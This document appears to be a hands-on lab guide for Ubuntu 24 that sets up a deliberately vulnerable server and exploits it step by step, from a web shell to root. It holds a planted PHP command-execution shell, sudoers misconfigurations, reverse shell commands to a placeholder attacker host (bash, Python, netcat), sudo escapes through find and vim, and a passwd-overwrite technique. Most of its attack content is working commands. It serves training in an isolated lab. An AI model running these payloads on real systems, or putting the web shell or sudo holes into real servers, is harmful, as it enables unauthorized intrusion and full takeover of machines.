# Privilege Escalation Lab - Ubuntu 24

## Overview
This lab demonstrates a complete attack chain from external web exploitation to root privilege escalation through sudo misconfigurations.

**Attack Chain:** External Web → www-data → jason → root

## Lab Setup

### Initial System Setup
```bash
# Create user jason
sudo useradd -m -s /bin/bash jason
sudo passwd jason

# Create test directories
sudo mkdir -p /var/www/test
sudo mkdir -p /home/jason/scripts
sudo mkdir -p /var/www/html
sudo mkdir -p /tmp/backup
```

### Web Vulnerability Setup
```bash
# Install required packages
sudo apt update
sudo apt install -y php apache2 php-cli

# Create vulnerable PHP script
sudo tee /var/www/html/admin.php << 'EOF'
<?php
// Vulnerable admin panel - DO NOT USE IN PRODUCTION
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Admin Panel - Use ?cmd=command";
}
?>
EOF

# Create index page
sudo tee /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Security Lab</title></head>
<body>
<h1>Security Lab Environment</h1>
<p><a href="admin.php">Admin Panel</a></p>
</body>
</html>
EOF

# Set permissions and start Apache
sudo chown www-data:www-data /var/www/html/*
sudo systemctl start apache2
sudo systemctl enable apache2
```

### www-data → jason Escalation Setup
```bash
# Create sample files for backup
sudo touch /var/www/html/index.html
sudo touch /var/www/html/test.txt
sudo chown www-data:www-data /var/www/html/*
sudo chown www-data:www-data /tmp/backup

# Create escalation script
sudo tee /var/www/test/simple.sh << 'EOF'
#!/bin/bash
echo "Running as: $(whoami)"
/bin/bash
EOF

sudo chown jason:jason /var/www/test/simple.sh
sudo chmod 755 /var/www/test/simple.sh

# Configure sudo for www-data
sudo tee /etc/sudoers.d/www-data << 'EOF'
www-data ALL=(jason) NOPASSWD: /var/www/test/simple.sh
EOF
```

### jason → root Escalation Setup
```bash
# Create multiple sudo misconfigurations for jason
sudo tee /etc/sudoers.d/jason << 'EOF'
jason ALL=(ALL) NOPASSWD: /usr/bin/find /home/jason -name *
jason ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/config.txt
jason ALL=(ALL) NOPASSWD: /bin/cp /home/jason/scripts/*
EOF

# Create config file for vim exploitation
sudo touch /etc/config.txt
sudo chmod 644 /etc/config.txt

# Set up directory structure
sudo mkdir -p /home/jason/scripts
sudo chown jason:jason /home/jason/scripts

# Create exploitation files
sudo -u jason tee /home/jason/scripts/exploit.sh << 'EOF'
#!/bin/bash
/bin/bash
EOF

sudo -u jason chmod +x /home/jason/scripts/exploit.sh
sudo cp /etc/passwd /home/jason/scripts/passwd.bak
sudo chown jason:jason /home/jason/scripts/passwd.bak
```

## Exploitation Guide

### Step 1: External Web Exploitation
```bash
# Test basic command execution
curl "http://TARGET_IP/admin.php?cmd=whoami"

# Get reverse shell (start listener first: nc -nlvp 4444)
curl "http://TARGET_IP/admin.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27"
```

### Step 2: Upgrade Shell
```bash
# In reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
# On attacker machine: stty raw -echo; fg
# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash
```

### Step 3: www-data → jason Escalation
```bash
# Check current user
whoami  # Should show www-data

# Check sudo permissions
sudo -l

# Escalate to jason
sudo -u jason /var/www/test/simple.sh
```

### Step 4: jason → root Escalation

#### Method 1: Using find
```bash
sudo find /home/jason -name "anything" -exec /bin/bash \;
```

#### Method 2: Using vim
```bash
sudo vim /etc/config.txt
# In vim, type: :!/bin/bash
```

#### Method 3: Using cp (passwd file manipulation)
```bash
# Create malicious passwd entry
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /home/jason/scripts/passwd.bak
# Replace $6$salt$hash with actual password hash

# Copy over original passwd
sudo cp /home/jason/scripts/passwd.bak /etc/passwd

# Login as new root user
su hacker
```

## Verification Commands
```bash
# Verify privilege escalation
whoami
id
cat /etc/shadow  # Should work if root
```

## URL Encoding Reference
```
Space: %20
&: %26
>: %3E
<: %3C
': %27
": %22
/: %2F
\: %5C
```

## Common Reverse Shell Payloads
```bash
# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444
```

## Clean Up
```bash
# Remove lab files
sudo rm -rf /var/www/test
sudo rm -f /etc/sudoers.d/www-data
sudo rm -f /etc/sudoers.d/jason
sudo rm -f /var/www/html/admin.php
sudo userdel -r jason
sudo systemctl stop apache2
```

## Security Notes
- This lab is for educational purposes only
- Use only in isolated test environments
- Never deploy these configurations in production
- Always clean up after testing

## Troubleshooting
- If web shell doesn't work, check Apache error logs: `sudo tail -f /var/log/apache2/error.log`
- If sudo doesn't work, verify sudoers syntax: `sudo visudo -c`
- If reverse shell fails, check firewall rules and network connectivity
